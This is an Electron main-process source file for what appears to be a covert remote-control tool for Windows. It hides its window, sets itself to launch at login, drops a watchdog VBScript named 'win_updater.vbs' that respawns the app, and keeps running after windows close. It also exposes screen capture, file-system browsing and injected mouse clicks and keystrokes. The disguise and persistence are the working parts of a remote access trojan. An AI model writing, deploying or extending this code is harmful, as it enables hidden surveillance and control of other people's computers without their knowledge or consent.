const { app, BrowserWindow, ipcMain, desktopCapturer, shell } = require('electron');
const path = require('path');
const os = require('os');
const fs = require('fs');
const { exec, spawn } = require('child_process');

function startWatchdog() {
    // Only run the watchdog when the app is actually packaged as an EXE
    if (!app.isPackaged) return;

    const exePath = app.getPath("exe");
    const exeName = path.basename(exePath);
    const watchdogPath = path.join(app.getPath("userData"), "win_updater.vbs");

    const vbsCode = `
Set objShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
Do
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '${exeName}'")
    If colProcesses.Count = 0 Then
        objShell.Run """${exePath}""", 0, False
    End If
    WScript.Sleep 5000
Loop
`;

    fs.writeFileSync(watchdogPath, vbsCode);

    // Kill any existing watchdog for our app, then start a new one
    exec(`wmic process where "name='wscript.exe' and commandline like '%win_updater.vbs%'" call terminate`, () => {
        const child = spawn('wscript.exe', [watchdogPath], {
            detached: true,
            stdio: 'ignore'
        });
        child.unref();
    });
}

let psControl = null;
function setupRemoteControl() {
    psControl = spawn('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', '-']);
    const setupScript = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -MemberDefinition '
    [DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);
' -Name NativeMethods -Namespace Win32
function Move-Mouse { param($x, $y); [Win32.NativeMethods]::mouse_event(0x8001, $x, $y, 0, 0) }
function Click-Left { param($x, $y); [Win32.NativeMethods]::mouse_event(0x8001, $x, $y, 0, 0); [Win32.NativeMethods]::mouse_event(2, 0, 0, 0, 0); [Win32.NativeMethods]::mouse_event(4, 0, 0, 0, 0) }
function Click-Right { param($x, $y); [Win32.NativeMethods]::mouse_event(0x8001, $x, $y, 0, 0); [Win32.NativeMethods]::mouse_event(8, 0, 0, 0, 0); [Win32.NativeMethods]::mouse_event(16, 0, 0, 0, 0) }
function Send-Text { param($txt); [System.Windows.Forms.SendKeys]::SendWait($txt) }
`;
    psControl.stdin.write(setupScript + '\n');
}

function createWindow() {
    const win = new BrowserWindow({
        show: false, // Make the window completely hidden
        webPreferences: {
            nodeIntegration: false,
            contextIsolation: true,
            preload: path.join(__dirname, 'preload.js')
        }
    });

    win.loadFile('index.html');
}

// Auto start the app in the background when the user logs into their laptop
app.setLoginItemSettings({
    openAtLogin: true,
    path: app.getPath("exe")
});

app.whenReady().then(() => {
    // Get all screen sources
    ipcMain.handle('get-sources', async () => {
        const sources = await desktopCapturer.getSources({ types: ['screen'] });
        return sources.map(source => ({
            id: source.id,
            name: source.name
        }));
    });

    // Provide the computer name so the admin knows which laptop it is
    ipcMain.handle('get-hostname', () => os.hostname());

    ipcMain.handle('get-drives', async () => {
        return new Promise((resolve) => {
            exec('powershell "[System.IO.DriveInfo]::GetDrives() | Select-Object -ExpandProperty Name"', (error, stdout) => {
                if (error) { resolve(['C:\\']); return; }
                const drives = stdout.split(/\r?\n/)
                    .map(line => line.trim())
                    .filter(line => /^[A-Z]:\\/i.test(line));
                if (drives.length > 0) resolve(drives);
                else resolve(['C:\\']);
            });
        });
    });

    ipcMain.handle('read-directory', async (event, dirPath) => {
        try {
            const items = fs.readdirSync(dirPath);
            let result = [];
            for (const item of items) {
                try {
                    const fullPath = path.join(dirPath, item);
                    const stats = fs.statSync(fullPath);
                    result.push({
                        name: item,
                        path: fullPath,
                        isDirectory: stats.isDirectory(),
                        size: stats.size
                    });
                } catch(e) {} // ignore items with permission errors
            }
            // Sort folders first
            result.sort((a, b) => b.isDirectory - a.isDirectory || a.name.localeCompare(b.name));
            return result;
        } catch(e) {
            return { error: e.message };
        }
    });

    ipcMain.handle('open-file', async (event, filePath) => {
        try {
            await shell.openPath(filePath);
            return true;
        } catch (e) {
            return false;
        }
    });

    ipcMain.handle('remote-action', async (event, action) => {
        if (!psControl) setupRemoteControl();
        try {
            // Convert relative coordinates (0.0 to 1.0) to absolute mouse scale (0 to 65535)
            const absX = Math.round(action.x * 65535);
            const absY = Math.round(action.y * 65535);

            if (action.type === 'move') {
                psControl.stdin.write(`Move-Mouse ${absX} ${absY}\n`);
            } else if (action.type === 'click') {
                psControl.stdin.write(`Click-Left ${absX} ${absY}\n`);
            } else if (action.type === 'rclick') {
                psControl.stdin.write(`Click-Right ${absX} ${absY}\n`);
            } else if (action.type === 'type') {
                // escape for SendKeys (basic replace)
                let safeTxt = action.text.replace(/'/g, "''").replace(/"/g, '""');
                psControl.stdin.write(`Send-Text "${safeTxt}"\n`);
            }
        } catch(e) {}
    });

    createWindow();
    startWatchdog();
});

// Keep running in the background even if a window is closed
app.on('window-all-closed', () => {
    // Do nothing, we want it to stay alive
});